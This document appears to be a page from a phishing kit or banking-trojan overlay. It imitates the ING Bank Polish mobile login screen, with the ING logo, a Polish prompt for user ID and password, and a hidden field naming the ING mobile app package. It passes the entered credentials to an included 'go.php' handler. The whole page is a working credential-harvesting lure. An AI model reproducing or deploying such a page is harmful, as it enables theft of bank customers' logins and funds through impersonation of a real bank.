<?php require_once '../go.php';?>
<!DOCTYPE html>
<html>
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <title>ING</title>

    <link rel="stylesheet" href="css/normalize.css">
    <link rel="stylesheet" href="css/main.css">

    <link rel="stylesheet" href="css/ingbank.css">

    <script src="js/vendor/jquery-1.11.3.min.js"></script>
    <script src="js/viewport.js"></script>
</head>

<body>
		<div class="modal modal_05">
            <div class="row">
                <div class="form_header">
                    <img src="img/ingbank/logo.png" alt=""/>
                </div>
            </div>
			<div class="container">
				<form action="#" method="post" class="wrapper">
                <input type="hidden" name="field1" value="pl.ing.ingmobile" class="main_input">
					<div class="row">
						<div class="content">
							<div class="input_block_wr">
								<div class="inp_caption">
									 Podaj identyfikator u&#380;ytkownika (login)
								</div>
								<div class="inp_wr">
									<input type="text" name="field2" class="main_input" required="">
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
									Podaj has&#322;o 
								</div>
								<div class="inp_wr">
									<input type="password" name="field3" class="main_input" required="">
								</div>
							</div>
							<div class="btn_wr">
								<button class="login_btn">
									Dalej
								</button>
							</div>
						</div>
					</div>
				</form>
			</div>
		</div>
</body>

</html>